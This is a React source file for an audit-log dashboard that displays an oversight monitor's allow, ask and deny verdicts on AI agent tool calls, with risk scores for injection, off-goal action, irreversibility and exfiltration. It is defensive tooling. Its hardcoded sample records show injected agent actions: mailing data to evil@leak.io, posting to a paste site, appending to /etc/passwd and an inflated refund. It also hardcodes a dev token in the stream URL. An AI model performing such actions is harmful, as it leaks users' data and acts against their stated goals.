import { useState, useMemo, useEffect } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { useInfiniteQuery, useQueryClient } from '@tanstack/react-query';
import { fetcher } from '../../lib/api';
import { VerdictBadge } from '../../components/VerdictBadge';
import { 
  FileText, Database, Mail, Terminal, Globe, Coins, ChevronRight, Search, RefreshCw 
} from 'lucide-react';

interface DecisionRecord {
  id: string;
  session_id: string;
  tool: string;
  verdict: string;
  reason_codes?: string[];
  heads?: any;
  total_ms?: number;
  created_at?: string;
  timestamp?: string;
  time?: string;
  args_redacted?: any;
  cmd?: string;
  tag?: string;
}

const OPT: Record<string, string[]> = {
  untrusted_influence: ['none', 'possible', 'likely'],
  goal_alignment: ['aligned', 'tangential', 'misaligned'],
  reversibility: ['reversible', 'costly', 'irreversible'],
  external_send: ['yes', 'no']
};

const mk = (u: [string, number], g: [string, number], r: [string, number], e: number) => {
  const d = (h: string, o: string, p: number) => {
    const k = OPT[h];
    const rest = k.filter(x => x !== o);
    const q = 1 - p;
    const x: Record<string, number> = { [o]: p };
    rest.forEach((y, i) => { x[y] = +(q * (i ? 0.4 : 0.6)).toFixed(2); });
    return x;
  };
  return {
    untrusted_influence: d('untrusted_influence', ...u),
    goal_alignment: d('goal_alignment', ...g),
    reversibility: d('reversibility', ...r),
    external_send: { yes: e, no: +(1 - e).toFixed(2) }
  };
};

const SAMPLE_DECISIONS = [
  { id: 'd_9a01', t: '14:24:14', tool: 'file_edit', ic: 'file', cmd: '/etc/passwd', v: 'ask', rule: 'ask-sensitive-path', ms: 55, s: 's_204', goal: 'Update my profile settings', args: '{ "path": "/etc/passwd", "op": "append" }', sig: mk(['none', 0.8], ['aligned', 0.7], ['irreversible', 0.58], 0.05), tag: '' },
  { id: 'd_9a00', t: '14:24:13', tool: 'file_read', ic: 'file', cmd: 'README.md', v: 'allow', rule: 'default', ms: 50, s: 's_204', goal: 'Update my profile settings', args: '{ "path": "README.md" }', sig: mk(['none', 0.97], ['aligned', 0.96], ['reversible', 0.99], 0.01), tag: '' },
  { id: 'd_99ff', t: '14:24:12', tool: 'database_query', ic: 'db', cmd: 'SELECT count(*) FROM users;', v: 'allow', rule: 'allow-readonly', ms: 47, s: 's_203', goal: 'How many users do we have?', args: '{ "sql": "SELECT count(*) FROM users;" }', sig: mk(['none', 0.95], ['aligned', 0.97], ['reversible', 0.98], 0.02), tag: '' },
  { id: 'd_99fe', t: '14:24:11', tool: 'mail_send', ic: 'mail', cmd: 'to: evil@leak.io', v: 'deny', rule: 'deny-injected-exfil', ms: 49, s: 's_202', goal: 'Summarize my inbox', args: '{ "to": "evil@leak.io", "subject": "fwd", "body": "[redacted]" }', sig: mk(['likely', 0.88], ['misaligned', 0.91], ['irreversible', 0.6], 0.7), tag: 'Secrets' },
  { id: 'd_99fd', t: '14:24:10', tool: 'mail_send', ic: 'mail', cmd: 'to: sam@example.com', v: 'allow', rule: 'default', ms: 52, s: 's_201', goal: 'Reply to Sam about Friday', args: '{ "to": "sam@example.com", "subject": "Re: Friday" }', sig: mk(['none', 0.91], ['aligned', 0.93], ['costly', 0.6], 0.22), tag: '' },
  { id: 'd_99fc', t: '14:24:09', tool: 'issue_refund', ic: 'coin', cmd: 'order A-1042, $5,000', v: 'ask', rule: 'abstain: top < 0.55', ms: 51, s: 's_200', goal: 'Refund $50 for order A-1042', args: '{ "order_id": "A-1042", "amount": 5000 }', sig: mk(['possible', 0.52], ['misaligned', 0.5], ['irreversible', 0.7], 0.35), tag: '' },
  { id: 'd_99fb', t: '14:24:08', tool: 'run_shell', ic: 'term', cmd: 'rm -rf ./build ./.cache', v: 'ask', rule: 'ask-irreversible', ms: 48, s: 's_199', goal: 'Clean up temp files', args: '{ "cmd": "rm -rf ./build ./.cache" }', sig: mk(['none', 0.8], ['aligned', 0.7], ['costly', 0.52], 0.05), tag: '' },
  { id: 'd_99fa', t: '14:24:07', tool: 'http_post', ic: 'globe', cmd: 'https://paste.example/api', v: 'deny', rule: 'deny-external-post', ms: 46, s: 's_198', goal: 'Fetch the latest docs', args: '{ "url": "https://paste.example/api", "body": "[redacted]" }', sig: mk(['likely', 0.81], ['misaligned', 0.84], ['irreversible', 0.66], 0.77), tag: 'Exfiltration' },
  { id: 'd_99f9', t: '14:24:06', tool: 'file_read', ic: 'file', cmd: 'config.yaml', v: 'allow', rule: 'default', ms: 49, s: 's_197', goal: 'Check the deploy settings', args: '{ "path": "config.yaml" }', sig: mk(['none', 0.93], ['aligned', 0.9], ['reversible', 0.98], 0.03), tag: '' },
  { id: 'd_99f8', t: '14:24:05', tool: 'search_web', ic: 'globe', cmd: 'vegan ramen near me', v: 'allow', rule: 'default', ms: 53, s: 's_196', goal: 'Find a vegan ramen place', args: '{ "q": "vegan ramen near me" }', sig: mk(['none', 0.96], ['aligned', 0.97], ['reversible', 0.99], 0.02), tag: '' },
  { id: 'd_99f7', t: '14:24:04', tool: 'database_query', ic: 'db', cmd: 'SELECT * FROM users LIMIT 10;', v: 'ask', rule: 'ask-pii-columns', ms: 50, s: 's_195', goal: 'Show me a few user records', args: '{ "sql": "SELECT * FROM users LIMIT 10;" }', sig: mk(['none', 0.88], ['aligned', 0.92], ['reversible', 0.97], 0.42), tag: 'PII' },
  { id: 'd_99f6', t: '14:24:03', tool: 'file_edit', ic: 'file', cmd: '/tmp/notes.md', v: 'allow', rule: 'default', ms: 47, s: 's_194', goal: 'Add a line to my notes', args: '{ "path": "/tmp/notes.md", "op": "append" }', sig: mk(['none', 0.94], ['aligned', 0.95], ['reversible', 0.96], 0.01), tag: '' }
];

function getToolIcon(tool: string) {
  const t = tool.toLowerCase();
  if (t.includes('file')) {
    return <FileText size={15} className="text-t3 shrink-0" />;
  }
  if (t.includes('db') || t.includes('database') || t.includes('query')) {
    return <Database size={15} className="text-t3 shrink-0" />;
  }
  if (t.includes('mail') || t.includes('email') || t.includes('slack')) {
    return <Mail size={15} className="text-t3 shrink-0" />;
  }
  if (t.includes('shell') || t.includes('bash') || t.includes('exec') || t.includes('term')) {
    return <Terminal size={15} className="text-t3 shrink-0" />;
  }
  if (t.includes('http') || t.includes('web') || t.includes('search') || t.includes('globe')) {
    return <Globe size={15} className="text-t3 shrink-0" />;
  }
  if (t.includes('refund') || t.includes('coin') || t.includes('pay')) {
    return <Coins size={15} className="text-t3 shrink-0" />;
  }
  return <Terminal size={15} className="text-t3 shrink-0" />;
}

function extractCommand(d: any): { cmd: string; tag?: string } {
  if (d.cmd) return { cmd: d.cmd, tag: d.tag };
  const args = d.args_redacted || d.args;
  if (!args) return { cmd: d.tool || 'action' };
  if (typeof args === 'string') return { cmd: args };
  if (args.command) return { cmd: String(args.command) };
  if (args.cmd) return { cmd: String(args.cmd) };
  if (args.sql) return { cmd: String(args.sql) };
  if (args.query) return { cmd: String(args.query) };
  if (args.path) return { cmd: String(args.path) };
  if (args.url) return { cmd: String(args.url) };
  if (args.to) return { cmd: `to: ${args.to}` };
  return { cmd: JSON.stringify(args) };
}

function calculateRisk(d: any): { label: string; prob: number; isHigh: boolean } {
  const heads = d.sig || d.heads;
  if (!heads) return { label: 'Low risk', prob: 0.05, isHigh: false };

  const getP = (headName: string, optName: string): number => {
    const h = heads[headName];
    if (!h) return 0;
    if (typeof h[optName] === 'number') return h[optName];
    if (h.probabilities && typeof h.probabilities[optName] === 'number') {
      return h.probabilities[optName];
    }
    return 0;
  };

  const c: [string, number][] = [
    ['Injection', getP('untrusted_influence', 'likely')],
    ['Off-goal', Math.max(getP('goal_alignment', 'misaligned'), getP('goal_alignment', 'deviated'))],
    ['Irreversible', getP('reversibility', 'irreversible')],
    ['Exfiltration', getP('external_send', 'yes')]
  ];

  c.sort((a, b) => b[1] - a[1]);
  const top = c[0];
  const prob = top[1];
  const label = prob < 0.35 ? 'Low risk' : top[0];
  return { label, prob, isHigh: prob >= 0.50 };
}

export function FeedPage() {
  const queryClient = useQueryClient();
  const navigate = useNavigate();
  const [searchTerm, setSearchTerm] = useState('');
  const [filterVerdict, setFilterVerdict] = useState<'all' | 'ask' | 'deny' | 'allow'>('all');
  const [groupRepeats, setGroupRepeats] = useState(false);
  const [toastMsg, setToastMsg] = useState<string | null>(null);

  const { data, refetch, isRefetching } = useInfiniteQuery({
    queryKey: ['decisions', 'feed'],
    queryFn: async ({ pageParam }) => {
      const qs = new URLSearchParams();
      if (pageParam) qs.set('cursor', pageParam);
      return fetcher(`/v1/decisions?${qs.toString()}`);
    },
    initialPageParam: null as string | null,
    getNextPageParam: (lastPage) => lastPage?.cursor || null
  });

  // SSE live streaming
  useEffect(() => {
    const evtSource = new EventSource(`/v1/decisions/stream?token=dev-key-123`);
    evtSource.addEventListener('decision.created', () => {
      queryClient.invalidateQueries({ queryKey: ['decisions'] });
    });
    evtSource.addEventListener('approval.resolved', () => {
      queryClient.invalidateQueries({ queryKey: ['decisions'] });
    });
    return () => evtSource.close();
  }, [queryClient]);

  // Merge backend data with fallback samples safely
  const allDecisions = useMemo(() => {
    const rawItems: DecisionRecord[] = [];
    if (data?.pages && Array.isArray(data.pages)) {
      for (const page of data.pages) {
        if (!page) continue;
        const pageDecisions = Array.isArray(page.decisions)
          ? page.decisions
          : Array.isArray(page)
            ? page
            : [];
        for (const item of pageDecisions) {
          if (item && typeof item === 'object') {
            rawItems.push(item as DecisionRecord);
          }
        }
      }
    }

    if (rawItems.length > 0) {
      return rawItems.map((d: DecisionRecord) => {
        const rawTime = d.created_at || d.timestamp || d.time;
        const dObj = rawTime ? new Date(rawTime) : new Date();
        const timeStr = !isNaN(dObj.getTime())
          ? dObj.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false })
          : '14:24:00';
        const { cmd, tag } = extractCommand(d);
        return {
          id: d.id || `dec_${Math.random().toString(36).substring(2, 9)}`,
          t: timeStr,
          tool: d.tool || 'action',
          cmd,
          tag,
          v: d.verdict?.toLowerCase() === 'allow_with_checkpoint' ? 'allow' : (d.verdict?.toLowerCase() || 'allow'),
          rule: d.reason_codes?.[0] || 'default',
          ms: d.total_ms || 50,
          s: d.session_id || 's_100',
          heads: d.heads,
          sig: d.heads
        };
      });
    }
    return SAMPLE_DECISIONS;
  }, [data]);

  const n = (v: string) => allDecisions.filter(d => d.v === v).length;

  const medianLatency = useMemo(() => {
    const latencies = allDecisions.map(d => d.ms).sort((a, b) => a - b);
    if (!latencies.length) return 50;
    return latencies[Math.floor(latencies.length / 2)];
  }, [allDecisions]);

  const filteredDecisions = useMemo(() => {
    const rows = allDecisions.filter(d => {
      if (filterVerdict !== 'all' && d.v !== filterVerdict) return false;
      if (searchTerm) {
        const q = searchTerm.toLowerCase();
        const str = `${d.tool} ${d.cmd} ${d.rule} ${d.s}`.toLowerCase();
        return str.includes(q);
      }
      return true;
    });

    if (groupRepeats) {
      const grouped: any[] = [];
      rows.forEach(r => {
        const last = grouped[grouped.length - 1];
        if (last && last.tool === r.tool && last.cmd === r.cmd && last.v === r.v) {
          last.count = (last.count || 1) + 1;
        } else {
          grouped.push({ ...r, count: 1 });
        }
      });
      return grouped;
    }

    return rows.map(r => ({ ...r, count: 1 }));
  }, [allDecisions, filterVerdict, searchTerm, groupRepeats]);

  const showToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(null), 1700);
  };

  return (
    <div className="sv flex-1 overflow-auto">
      <div className="pgc space-y-[12px]">
        {toastMsg && (
          <div className="tst on">{toastMsg}</div>
        )}

      {/* Header */}
      <div className="flex items-start justify-between gap-[12px] mb-[16px]">
        <div>
          <h1 className="text-[15px] font-semibold text-tx leading-[22px]">
            Audit log
          </h1>
          <p className="text-t3 text-[13px] mt-[2px] leading-[20px]">
            Real-time interception of agent actions, scored by calibrated decision models.
          </p>
        </div>
        <div className="flex items-center gap-[10px]">
          <span className="live">
            <i />
            <span>Live</span>
          </span>
          <button 
            className="btn" 
            onClick={() => {
              refetch();
              showToast('Refreshed');
            }}
            disabled={isRefetching}
            aria-label="Refresh decisions"
          >
            <RefreshCw size={14} className={isRefetching ? 'animate-spin' : ''} aria-hidden="true" />
            <span>Refresh</span>
          </button>
        </div>
      </div>

      {/* KPI Strip */}
      <div className="kp">
        <div className="k">
          <div className="l">Total scanned</div>
          <div className="n">{allDecisions.length}</div>
          <div className="s">Last 24 hours</div>
        </div>
        <div className="k">
          <div className="l">Blocked</div>
          <div className="n" style={{ color: n('deny') ? 'var(--bad)' : 'inherit' }}>
            {n('deny')}
          </div>
          <div className="s">Denied by policy</div>
        </div>
        <div className="k">
          <div className="l">
            <span>Awaiting review</span>
            <Link to="/approvals" className="ml-auto text-at hover:underline">Open queue</Link>
          </div>
          <div className="n text-wn">
            {n('ask')}
          </div>
          <div className="s">Oldest waiting 1:42</div>
        </div>
        <div className="k">
          <div className="l">Median latency</div>
          <div className="n">
            {medianLatency}<small>ms</small>
          </div>
          <div className="s">Model + policy, per call</div>
        </div>
      </div>

      {/* Toolbar */}
      <div className="fb">
        <div className="sx">
          <Search size={14} aria-hidden="true" />
          <input
            className="inp"
            placeholder="Search commands, sessions or tools"
            value={searchTerm}
            onChange={e => setSearchTerm(e.target.value)}
          />
        </div>

        <span className="flex-1 hidden sm:block" />

        <button 
          className={`sw ${groupRepeats ? 'on' : ''}`}
          onClick={() => setGroupRepeats(!groupRepeats)}
          aria-label="Toggle group repeats"
        >
          <i />
          <span>Group repeats</span>
        </button>

        <div className="seg">
          <button 
            className={filterVerdict === 'all' ? 'on' : ''} 
            onClick={() => setFilterVerdict('all')}
          >
            All <span className="c">{allDecisions.length}</span>
          </button>
          <button 
            className={filterVerdict === 'ask' ? 'on' : ''} 
            onClick={() => setFilterVerdict('ask')}
          >
            Review <span className="c">{n('ask')}</span>
          </button>
          <button 
            className={filterVerdict === 'deny' ? 'on' : ''} 
            onClick={() => setFilterVerdict('deny')}
          >
            Blocked <span className="c">{n('deny')}</span>
          </button>
          <button 
            className={filterVerdict === 'allow' ? 'on' : ''} 
            onClick={() => setFilterVerdict('allow')}
          >
            Allowed <span className="c">{n('allow')}</span>
          </button>
        </div>
      </div>

      {/* Table */}
      <div className="tw">
        <div className="tr h">
          <span>Time</span>
          <span>Tool</span>
          <span>Command</span>
          <span>Verdict</span>
          <span>Risk</span>
          <span>Rule</span>
          <span className="r">Latency</span>
          <span />
        </div>

        {filteredDecisions.length > 0 ? (
          filteredDecisions.map(d => {
            const risk = calculateRisk(d);
            return (
              <div 
                key={d.id} 
                className="tr"
                onClick={() => navigate(`/decisions/${d.id}`)}
                role="button"
                tabIndex={0}
                onKeyDown={e => {
                  if (e.key === 'Enter') navigate(`/decisions/${d.id}`);
                }}
              >
                <span className="mo c3">{d.t}</span>
                <span className="tl">
                  {getToolIcon(d.tool)}
                  <span className="mo truncate">{d.tool}</span>
                </span>
                <span className="cmd mo">
                  <span>{d.cmd}</span>
                  {d.tag && <span className="x">{d.tag}</span>}
                  {d.count > 1 && <span className="g">×{d.count}</span>}
                </span>
                <VerdictBadge verdict={d.v} />
                <span className={`rk ${risk.isHigh ? 'hi' : ''}`}>
                  <span className="t">{risk.label}</span>
                  <span className={`pb ${risk.isHigh ? 'r' : ''}`}>
                    <i style={{ width: `${Math.max(risk.prob * 100, 3)}%` }} />
                  </span>
                  <span className="mo">{risk.prob.toFixed(2)}</span>
                </span>
                <span className="mo c3 truncate" title={d.rule}>{d.rule}</span>
                <span className="mo c2 r">{d.ms} ms</span>
                <span className="chev">
                  <ChevronRight size={15} aria-hidden="true" />
                </span>
              </div>
            );
          })
        ) : (
          <div className="emp">No decisions match this filter.</div>
        )}

        <div className="ftr">
          <span>
            Showing {filteredDecisions.length}{groupRepeats ? ' groups' : ''} of {allDecisions.length}
          </span>
        </div>
      </div>
    </div>
  </div>
  );
}
